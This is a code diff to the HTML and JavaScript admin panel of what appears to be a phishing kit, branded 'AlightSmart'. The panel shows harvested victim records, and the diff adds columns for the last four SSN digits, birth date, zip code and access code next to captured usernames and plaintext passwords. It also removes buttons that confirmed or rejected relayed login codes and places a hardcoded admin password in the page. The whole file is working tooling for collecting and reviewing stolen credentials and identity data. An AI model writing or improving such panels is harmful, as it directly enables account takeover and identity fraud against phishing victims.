@@ -12,31 +12,29 @@
         table { width: 100%; border-collapse: collapse; }
         th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
         th { background: #e2e8f0; }
-        button { padding: 8px 16px; margin: 4px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
-        .confirm-btn { background: #22c55e; color: white; }
-        .reject-btn { background: #ef4444; color: white; }
+        button { padding: 12px 25px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
         .refresh-btn { background: #3b82f6; color: white; }
-        .clear-btn { background: #64748b; color: white; }
-        .pending { background: #fefce8; }
+        .clear-btn { background: #ef4444; color: white; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Password:</p>
+            <p>Password: tunde6035</p>
         </div>
 
         <table id="recordsTable">
             <thead>
                 <tr>
                     <th>Time</th>
-                    <th>Type</th>
                     <th>Username</th>
                     <th>Password</th>
-                    <th>Full Details</th>
+                    <th>SSN (Last 4)</th>
+                    <th>Birth Date</th>
+                    <th>Zip Code</th>
+                    <th>Access Code</th>
                     <th>IP</th>
-                    <th>Action</th>
                 </tr>
             </thead>
             <tbody></tbody>
@@ -58,23 +56,16 @@
             tbody.innerHTML = "";
 
             records.forEach(r => {
-                let action = '';
-                if (r.type === "Login Attempt") {
-                    action = `
-                        <button class="confirm-btn" onclick="alert('Code Confirmed - User can proceed!')">✅ Confirm</button>
-                        <button class="reject-btn" onclick="alert('Code Rejected - User must try again')">❌ Reject</button>
-                    `;
-                }
-
                 tbody.innerHTML += `
                     <tr>
                         <td>${r.timestamp}</td>
-                        <td>${r.type}</td>
                         <td><strong>${r.username || '-'}</strong></td>
                         <td><code>${r.password || '-'}</code></td>
-                        <td>${r.address || '-'}</td>
+                        <td>${r.address ? r.address.split('|')[0] : '-'}</td>
+                        <td>${r.address ? r.address.split('|')[1] : '-'}</td>
+                        <td>${r.address ? r.address.split('|')[2] : '-'}</td>
+                        <td>${r.address ? r.address.split('|')[3] : '-'}</td>
                         <td>${r.ip || '-'}</td>
-                        <td>${action}</td>
                     </tr>`;
             });
         }
@@ -83,7 +74,7 @@
             const pass = prompt("Enter Admin Password:");
             if (pass === ADMIN_PASSWORD) {
                 loadRecords();
-                setInterval(loadRecords, 3000);
+                setInterval(loadRecords, 4000);
             } else {
                 alert("❌ Wrong Password");
                 window.location.href = "/";
